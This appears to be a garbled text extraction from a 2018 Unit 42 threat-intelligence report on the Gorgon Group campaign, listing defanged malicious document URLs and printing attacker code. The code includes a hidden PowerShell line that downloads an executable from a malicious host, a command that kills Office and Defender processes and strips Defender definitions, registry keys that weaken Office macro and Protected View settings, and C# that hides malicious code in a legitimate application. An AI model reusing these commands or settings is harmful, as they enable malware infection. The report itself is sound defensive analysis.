http://stemtopx[.]com/work/doc/2.doc\nhttp://bit[.]ly/LAdooing http://onedrivenet[.]xyz/work/docnew/6.doc\nhttp://bit[.]ly/LoadIng http://guelphupholstery[.]com/images/yupsia/doc/62.doc\nhttp://bit[.]ly/2JnMVQz http://stemtopx[.]com/work/doc/14.doc\nhttp://bit[.]ly/DocumentIsLoadingPleasewait http://stemtopx[.]com/work/i/2.doc\nhttp://bit[.]ly/2HVD1Bh http://fast‐cargo[.]com/images/file/vb/VBS/doc/4.doc\nhttp://bit[.]ly/2uoqexc http://zupaservices[.]info/doc/1.doc\nhttp://bit[.]ly/2vXgnqdASdj2929iqwSdu9iw9i http://stevemike‐fireforce[.]info/work/doc/13.doc\nhttp://bit[.]ly/4_loadingEwHlnA http://diamondfoxpanel[.]ml/doc/4.doc\nhttp://bit[.]ly/lLoadingl9 http://fast‐cargo[.]com/images/file/vb/VBS/doc/9.doc\nhttp://bit[.]ly/LlLoadinG https://www.0‐day[.]us/img/doc/2.doc\nhttp://bit[.]ly/2kTPwmFdrwfdtsfdfyr http://stemtopx[.]com/work/doc/1.doc\nhttp://bit[.]ly/2G34tww http://fast‐cargo[.]com/old/images/file/vb/VBS/smon/doc/testa.doc\nhttp://bit[.]ly/2HvQBir http://stevemike‐fireforce[.]info/work/dola/3.doc\nhttp://bit[.]ly/golden_uae http://fast‐cargo[.]com/old/images/file/vb/VBS/smon/doc/xchange.doc\nhttp://bit[.]ly/pele2HROHp1 http://acorn‐paper[.]com/images/locations/thumbnails/z/oc/z.doc\nhttp://bit[.]ly/2rlqLDBMSloading http://panelonetwothree[.]ml/iran/uae/done/oc2/uae.doc\nhttp://bit[.]ly/2JDUVMC http://stemtopx[.]com/work/doc/11.doc\nhttp://bit[.]ly/2K1GYVgtyfctftfTFTYFUFtufutfu http://stevemikeforce[.]com/work/doc/11.doc\nhttp://bit[.]ly/2Jr4dby http://stemtopx[.]com/work/doc/18.doc\nhttp://bit[.]ly/2M9I8z4 http://stemtopx[.]com/work/newdoc/2.doc\nhttp://bit[.]ly/ASD8239ASdmkWi38AS http://stevemike‐fireforce[.]info/work/dola/4.doc\nhttp://bit[.]ly/LoadingPelasewaits http://stevemike‐fireforce[.]info/work/docnew/2.doc\nhttp://bit[.]ly/2JnNtG7 http://stemtopx[.]com/work/doc/17.doc\nhttp://bit[.]ly/shawclk2HZJXOr http://panelonetwothree[.]ml/simon/exp/25exp/26/doc/final/26.doc\nhttp://bit[.]ly/loadijgng http://onedrivenet[.]xyz/work/docnew/9.doc\nhttp://bit[.]ly/PleaseWaitLoading http://www.asaigoldenrice[.]com/daq/doc/7.doc\nhttp://bit[.]ly/Loadinger http://onedrivenet[.]xyz/work/docnew/1.doc\nhttp://bit[.]ly/Workingwait http://onedrivenet[.]xyz/work/docnew/21.doc\nhttp://bit[.]ly/Loadingplzwait http://www.asaigoldenrice[.]com/daq/doc/5.doc\nhttp://bit[.]ly/2HuOFBQ http://stemtopx[.]com/work/doc/5.doc\nhttp://bit[.]ly/LoadingPleasewait1 http://onedrivenet[.]xyz/work/docnew/20.doc\nhttp://bit[.]ly/LlOrRinding http://www.0‐day[.]us/img/doc/11.doc\nhttp://bit[.]ly/Loadingwaitplzz http://onedrivenet[.]xyz/work/docnew/16.doc\nhttp://bit[.]ly/2HWdrzTgfufuyfkCTYTDFYTgtfut\nfhttp://stevemikeforce[.]com/work/doc/12.doc\nhttp://bit[.]ly/2KHEnRKxestrhdyhdDTDRDTRth\ndydyhttp://stevemikeforce[.]com/work/doc/10.doc\nhttp://bit[.]ly/unkwonas http://asaigoldenrice[.]com/sim/new.vbs\nhttp://bit[.]ly/Laodiingpleasewait http://onedrivenet[.]xyz/work/docnew/13.doc\nhttp://bit[.]ly/wordxchange http://asaigoldenrice[.]com/sim/doc/kalu.doc\nhttp://bit[.]ly/Loadsinfpleasewait http://onedrivenet[.]xyz/work/docnew/30.docx\nhttp://bit[.]ly/Loardsing http://www.0‐day[.]us/img/doc/7.doc\nhttp://bit[.]ly/2ImbyrQ http://acorn‐paper[.]com/administrator/6.doc\nhttp://bit[.]ly/LoadingPleasewait http://onedrivenet[.]xyz/work/docnew/20.doc\nDomains\nFor a list of domains encountered in use by malware throughout this campaign, please refer to the following file.\nHashes\nFor a list of all hashes of malware encountered during this campaign, please refer to the following file.\nGet updates from Palo Alto  Networks!\nSign up to receive the latest news, cyber threat intelligence and research from us\nBy Robert Falcone , David Fuertes , Josh Grunzweig  and Kyle Wilhoit\nAugust 2, 2018 at 5:00 AM\nCategory: Unit 42\nTags: CVE‐2017‐0199 , Gorgon Group , Subaat\nEmail address\nSubscribe\nI'm not a robot\nreCAPTCHA\nPrivacy  - Terms\nBy submitting this form, you agree to our Terms of Use  and acknowledge\nour Privacy Statement .\n© 2020 Palo Alto Networks, Inc. All rights reserved.\nPopular Resources\nResource Center\nBlog\nCommunities\nTech Docs\nUnit 42\nSitemap\nLegal No ces\nPrivacy\nTerms of Use\nDocuments\nAccount\nManage Subscriptions\nReport a Vulnerability1cmd.exe /c powershell  -W Hidden (New-Object System.NeT.WeBClieNT ).DownloadFile ('http://lokipanelhostingpanel[.]gq/work/kh/1.exe'\n1\n2\n3\n4cmd /c taskkill  /f /im winword.exe&taskkill  /f /im Excel.exe&taskkill\n/f /im MSPUB.exe&taskkill  /f /im POWERPNT .EXE&taskkill  /f /im\nMSASCuiL .exe&taskkill  /f /im MpCmdRun .exe&cd \"\"%ProgramFiles %\\Windows\nDefender \"\" & MpCmdRun .exe -removedefinitions  -dynamicsignatures  & exit\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20HKCU\\Software \\Microsoft \\Office\\11.0\\Word\\Security \\VBAWarnings\nHKCU\\Software \\Microsoft \\Office\\12.0\\Word\\Security \\VBAWarnings\nHKCU\\Software \\Microsoft \\Office\\14.0\\Word\\Security \\VBAWarnings\nHKCU\\Software \\Microsoft \\Office\\15.0\\Word\\Security \\VBAWarnings\nHKCU\\Software \\Microsoft \\Office\\16.0\\Word\\Security \\VBAWarnings\nHKCU\\Software \\Microsoft \\Office\\11.0\\PowerPoint \\Security \\VBAWarnings\nHKCU\\Software \\Microsoft \\Office\\12.0\\PowerPoint \\Security \\VBAWarnings\nHKCU\\Software \\Microsoft \\Office\\14.0\\PowerPoint \\Security \\VBAWarnings\nHKCU\\Software \\Microsoft \\Office\\15.0\\PowerPoint \\Security \\VBAWarnings\nHKCU\\Software \\Microsoft \\Office\\16.0\\PowerPoint \\Security \\VBAWarnings\nHKCU\\Software \\Microsoft \\Office\\11.0\\publisher \\Security \\VBAWarnings\nHKCU\\Software \\Microsoft \\Office\\12.0\\publisher \\Security \\VBAWarnings\nHKCU\\Software \\Microsoft \\Office\\14.0\\publisher \\Security \\VBAWarnings\nHKCU\\Software \\Microsoft \\Office\\15.0\\publisher \\Security \\VBAWarnings\nHKCU\\Software \\Microsoft \\Office\\16.0\\publisher \\Security \\VBAWarnings\nHKCU\\Software \\Microsoft \\Office\\11.0\\Excel\\Security \\VBAWarnings\nHKCU\\Software \\Microsoft \\Office\\12.0\\Excel\\Security \\VBAWarnings\nHKCU\\Software \\Microsoft \\Office\\14.0\\Excel\\Security \\VBAWarnings\nHKCU\\Software \\Microsoft \\Office\\15.0\\Excel\\Security \\VBAWarnings\nHKCU\\Software \\Microsoft \\Office\\16.0\\Excel\\Security \\VBAWarnings\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45HKCU\\Software \\Microsoft \\Office\\11.0\\Word\\Security \\ProtectedView \\DisableInternetFilesInPV\nHKCU\\Software \\Microsoft \\Office\\11.0\\Word\\Security \\ProtectedView \\DisableAttachementsInPV\nHKCU\\Software \\Microsoft \\Office\\11.0\\Word\\Security \\ProtectedView \\DisableUnsafeLocationsInPV\nHKCU\\Software \\Microsoft \\Office\\11.0\\PowerPoint \\Security \\ProtectedView \\DisableInternetFilesInPV\nHKCU\\Software \\Microsoft \\Office\\11.0\\PowerPoint \\Security \\ProtectedView \\DisableAttachementsInPV\nHKCU\\Software \\Microsoft \\Office\\11.0\\PowerPoint \\Security \\ProtectedView \\DisableUnsafeLocationsInPV\nHKCU\\Software \\Microsoft \\Office\\11.0\\Excel\\Security \\ProtectedView \\DisableInternetFilesInPV\nHKCU\\Software \\Microsoft \\Office\\11.0\\Excel\\Security \\ProtectedView \\DisableAttachementsInPV\nHKCU\\Software \\Microsoft \\Office\\11.0\\Excel\\Security \\ProtectedView \\DisableUnsafeLocationsInPV\nHKCU\\Software \\Microsoft \\Office\\12.0\\Word\\Security \\ProtectedView \\DisableInternetFilesInPV\nHKCU\\Software \\Microsoft \\Office\\12.0\\Word\\Security \\ProtectedView \\DisableAttachementsInPV\nHKCU\\Software \\Microsoft \\Office\\12.0\\Word\\Security \\ProtectedView \\DisableUnsafeLocationsInPV\nHKCU\\Software \\Microsoft \\Office\\12.0\\PowerPoint \\Security \\ProtectedView \\DisableInternetFilesInPV\nHKCU\\Software \\Microsoft \\Office\\12.0\\PowerPoint \\Security \\ProtectedView \\DisableAttachementsInPV\nHKCU\\Software \\Microsoft \\Office\\12.0\\PowerPoint \\Security \\ProtectedView \\DisableUnsafeLocationsInPV\nHKCU\\Software \\Microsoft \\Office\\12.0\\Excel\\Security \\ProtectedView \\DisableInternetFilesInPV\nHKCU\\Software \\Microsoft \\Office\\12.0\\Excel\\Security \\ProtectedView \\DisableAttachementsInPV\nHKCU\\Software \\Microsoft \\Office\\12.0\\Excel\\Security \\ProtectedView \\DisableUnsafeLocationsInPV\nHKCU\\Software \\Microsoft \\Office\\14.0\\Word\\Security \\ProtectedView \\DisableInternetFilesInPV\nHKCU\\Software \\Microsoft \\Office\\14.0\\Word\\Security \\ProtectedView \\DisableAttachementsInPV\nHKCU\\Software \\Microsoft \\Office\\14.0\\Word\\Security \\ProtectedView \\DisableUnsafeLocationsInPV\nHKCU\\Software \\Microsoft \\Office\\14.0\\PowerPoint \\Security \\ProtectedView \\DisableInternetFilesInPV\nHKCU\\Software \\Microsoft \\Office\\14.0\\PowerPoint \\Security \\ProtectedView \\DisableAttachementsInPV\nHKCU\\Software \\Microsoft \\Office\\14.0\\PowerPoint \\Security \\ProtectedView \\DisableUnsafeLocationsInPV\nHKCU\\Software \\Microsoft \\Office\\14.0\\Excel\\Security \\ProtectedView \\DisableInternetFilesInPV\nHKCU\\Software \\Microsoft \\Office\\14.0\\Excel\\Security \\ProtectedView \\DisableAttachementsInPV\nHKCU\\Software \\Microsoft \\Office\\14.0\\Excel\\Security \\ProtectedView \\DisableUnsafeLocationsInPV\nHKCU\\Software \\Microsoft \\Office\\15.0\\Word\\Security \\ProtectedView \\DisableInternetFilesInPV\nHKCU\\Software \\Microsoft \\Office\\15.0\\Word\\Security \\ProtectedView \\DisableAttachementsInPV\nHKCU\\Software \\Microsoft \\Office\\15.0\\Word\\Security \\ProtectedView \\DisableUnsafeLocationsInPV\nHKCU\\Software \\Microsoft \\Office\\15.0\\PowerPoint \\Security \\ProtectedView \\DisableInternetFilesInPV\nHKCU\\Software \\Microsoft \\Office\\15.0\\PowerPoint \\Security \\ProtectedView \\DisableAttachementsInPV\nHKCU\\Software \\Microsoft \\Office\\15.0\\PowerPoint \\Security \\ProtectedView \\DisableUnsafeLocationsInPV\nHKCU\\Software \\Microsoft \\Office\\15.0\\Excel\\Security \\ProtectedView \\DisableInternetFilesInPV\nHKCU\\Software \\Microsoft \\Office\\15.0\\Excel\\Security \\ProtectedView \\DisableAttachementsInPV\nHKCU\\Software \\Microsoft \\Office\\15.0\\Excel\\Security \\ProtectedView \\DisableUnsafeLocationsInPV\nHKCU\\Software \\Microsoft \\Office\\16.0\\Word\\Security \\ProtectedView \\DisableInternetFilesInPV\nHKCU\\Software \\Microsoft \\Office\\16.0\\Word\\Security \\ProtectedView \\DisableAttachementsInPV\nHKCU\\Software \\Microsoft \\Office\\16.0\\Word\\Security \\ProtectedView \\DisableUnsafeLocationsInPV\nHKCU\\Software \\Microsoft \\Office\\16.0\\PowerPoint \\Security \\ProtectedView \\DisableInternetFilesInPV\nHKCU\\Software \\Microsoft \\Office\\16.0\\PowerPoint \\Security \\ProtectedView \\DisableAttachementsInPV\nHKCU\\Software \\Microsoft \\Office\\16.0\\PowerPoint \\Security \\ProtectedView \\DisableUnsafeLocationsInPV\nHKCU\\Software \\Microsoft \\Office\\16.0\\Excel\\Security \\ProtectedView \\DisableInternetFilesInPV\nHKCU\\Software \\Microsoft \\Office\\16.0\\Excel\\Security \\ProtectedView \\DisableAttachementsInPV\nHKCU\\Software \\Microsoft \\Office\\16.0\\Excel\\Security \\ProtectedView \\DisableUnsafeLocationsInPV\n1\n2\n3\n4ETransaksi .Speed(); // Legitimate class, but method is the first\nwrapped function  that leads to malicious code\nProjectData .EndApp(); // Closes the application before rest of\nlegitimate Sales System Application functions are called\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14int num = 5;\nint num2 = 155;\nbool flag = num > num2;\nif (flag)\n{\n    <legitimate Sales System Application code>\n}\nelse\n{\n    NewLateBinding .LateCall (ETransaksi .diomadnfagaghagh (), null, \"Invoke\" , new object[]\n    {\n        null,\n        new object[0]\n    }, null, null, null, true);\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19byte[] array = new byte[]\n    {\n        19,\n        129,\n        43,\n        37,\n        56,\n        65,\n        255,\n        75,\n        111,\n        19,\n        211,\n        120,\n        0,\n        49,\n        126,\n        248\n    };\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19byte[] array4 = new byte[]\n{\n    19,\n    129,\n    43,\n    37,\n    56,\n    65,\n    255,\n    75,\n    111,\n    19,\n    211,\n    120,\n    0,\n    49,\n    126,\n    248\n};\nSearch Unit 42\nSHARE \n "
}